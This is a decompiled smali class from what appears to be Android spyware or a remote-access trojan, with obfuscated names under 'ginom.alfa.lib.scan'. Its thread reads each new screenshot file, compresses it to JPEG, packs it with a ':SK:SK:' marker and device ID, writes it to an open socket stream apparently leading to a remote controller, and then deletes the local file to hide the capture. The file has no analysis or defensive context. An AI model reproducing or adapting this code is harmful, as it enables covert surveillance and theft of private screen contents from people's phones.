.class Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5$1;
.super Ljava/lang/Thread;
.source "etepaejhucdoifemyubbjerbt112.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5;->onEvent(ILjava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$1:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5;

.field final synthetic val$path:Ljava/lang/String;


# direct methods
.method constructor <init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5;Ljava/lang/String;)V
    .locals 0

    .line 405
    iput-object p1, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5$1;->this$1:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5;

    iput-object p2, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5$1;->val$path:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    const-wide/16 v0, 0x3e8

    .line 410
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 413
    :catch_0
    :try_start_1
    iget-object v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5$1;->val$path:Ljava/lang/String;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5$1;->val$path:Ljava/lang/String;

    const-string v1, "null"

    if-eq v0, v1, :cond_2

    iget-object v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5$1;->val$path:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_2

    .line 415
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5$1;->this$1:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5;

    iget-object v2, v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5;->val$ScreenShotPath:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5$1;->val$path:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 416
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    .line 422
    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v1, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5$1;->this$1:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5;

    iget-object v1, v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5;->val$ScreenShotPath:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5$1;->val$path:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/graphics/BitmapFactory;->decodeFile(Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object v0

    if-nez v0, :cond_1

    return-void

    .line 427
    :cond_1
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 430
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v2

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v3

    const/4 v4, 0x0

    .line 429
    invoke-static {v0, v4, v4, v2, v3}, Landroid/graphics/Bitmap;->createBitmap(Landroid/graphics/Bitmap;IIII)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 432
    sget-object v2, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v3, 0x14

    invoke-virtual {v0, v2, v3, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 435
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    .line 439
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->scr:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ":SK:SK:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->PID:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->_formtpakt_methd_(Ljava/lang/String;[B)[B

    move-result-object v0

    .line 440
    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->rec_etepaejhucdoifemyubbjerbt12_iver:Ljava/net/Socket;

    array-length v2, v0

    invoke-virtual {v1, v2}, Ljava/net/Socket;->setSendBufferSize(I)V

    .line 441
    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->outpu_etepaejhucdoifemyubbjerbt12_tnew:Ljava/io/OutputStream;

    array-length v2, v0

    invoke-virtual {v1, v0, v4, v2}, Ljava/io/OutputStream;->write([BII)V

    .line 442
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5$1;->this$1:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5;

    iget-object v2, v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5;->val$ScreenShotPath:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5$1;->val$path:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->delete()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_2
    return-void
.end method
